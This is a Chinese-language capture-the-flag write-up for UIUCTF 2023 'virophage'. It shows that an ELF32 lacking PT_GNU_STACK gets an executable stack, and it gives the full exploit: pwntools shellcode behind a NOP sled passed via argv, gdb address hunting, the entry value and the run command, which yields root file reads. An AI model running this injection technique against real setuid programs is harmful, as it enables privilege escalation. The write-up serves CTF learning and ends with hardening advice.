# UIUCTF 2023 Virophage Writeup

## 题目简述

`virophage` 是 setuid-root 启动器。它要求输入一个 32 位十六进制数，把该值写成新 ELF 的 `e_entry`，随后生成 `/tmp/virus`、切换到 UID 0、关闭 ASLR，并以原来的 `argv` 和 `envp` 执行这个 ELF。

生成的“virus”只有 ELF32 文件头和一个 `PT_NULL` program header，没有任何可加载代码段，也没有 `PT_GNU_STACK`。目标是在没有常规 `.text` 的情况下，让攻击者控制的入口地址执行已有数据。

## 解题过程

### 1. 找到意外的可执行栈

在测试虚拟机中让入口地址为 0，`execve` 后暂停并查看映射：

```text
0xf7ff8000 0xf7ffc000 r--p [vvar]
0xf7ffc000 0xf7ffe000 r-xp [vdso]
0xfffdd000 0xffffe000 rwxp [stack]
```

32 位 ELF 缺少 `PT_GNU_STACK` 时，x86 Linux 的 `elf_read_implies_exec()` 会在 IA32 兼容模式下采用 `READ_IMPLIES_EXEC`：可读的匿名映射也会具有执行权限。因此该极简 ELF 的初始栈不是 RW，而是 RWX。64 位版本在相同缺失条件下默认 `exec-none`，这也是题目改成 ELF32 后才出现的关键差异。

### 2. 通过 argv 把 shellcode带入新进程

启动器最终调用：

```c
execve("/tmp/virus", argv, envp);
```

所以传给 setuid 启动器的参数和环境会原样进入新进程，并由内核放在初始栈上。可以把 32 位 shellcode作为 `argv[1]`，前面加较长 NOP sled，再把 `e_entry` 指向 sled 中间。

使用 pwntools 生成读取 `/mnt/flag` 的无 NUL i386 shellcode，并编码为便于粘贴的 Base64：

```python
from pwn import asm, b64e, context, shellcraft

context.clear(arch="i386", os="linux")
shellcode = asm(shellcraft.cat("/mnt/flag"))
payload = shellcode.rjust(0x100, b"\x90")
print(b64e(payload))
```

将输出保存到远端：

```bash
printf '%s' '这里替换为上一段输出' | base64 -d > /home/user/arg
```

### 3. 确定固定入口并执行

本地使用相同内核、参数长度和环境启动，在 `/tmp/virus` 执行后搜索 NOP sled：

```gdb
find $esp, +0x200, (int)0x90909090
```

赛题环境中可选择稳定落在 sled 内的：

```text
0xffffde30
```

关闭 ASLR 只能保证相同启动布局下地址稳定；若改变参数或环境长度，应重新确认入口。保持布局不变并运行：

```bash
./virophage "$(base64 -d /home/user/arg)"
```

在提示处输入：

```text
ffffde30
```

内核从初始栈上的 NOP sled 开始执行 shellcode。由于启动器已 `setuid(0)`，shellcode直接读取挂载的 flag：

```text
uiuctf{windows_defender_wont_catch_this_bc238ba4}
```

作者原文只说明了 RWX 栈这一意外解法；上述参数注入、调试地址和远端复现步骤可在 [公开选手复现记录](https://nyancat0131.moe/post/ctf-writeups/uiu-ctf/2023/writeup/) 中交叉核对，关键内容已完整转写在正文。

## 方法总结

利用链是 `可控 ELF e_entry → ELF32 缺失 PT_GNU_STACK 导致 RWX 初始栈 → argv 携带 shellcode → ADDR_NO_RANDOMIZE 固定地址 → setuid-root shellcode`。题目原计划在 VDSO 中做 ROP，但架构相关的 ELF 默认策略产生了更直接的代码注入路径。构造极简 ELF 时应明确提供不可执行的 `PT_GNU_STACK`，并避免把攻击者控制的参数原样传给高权限子进程。
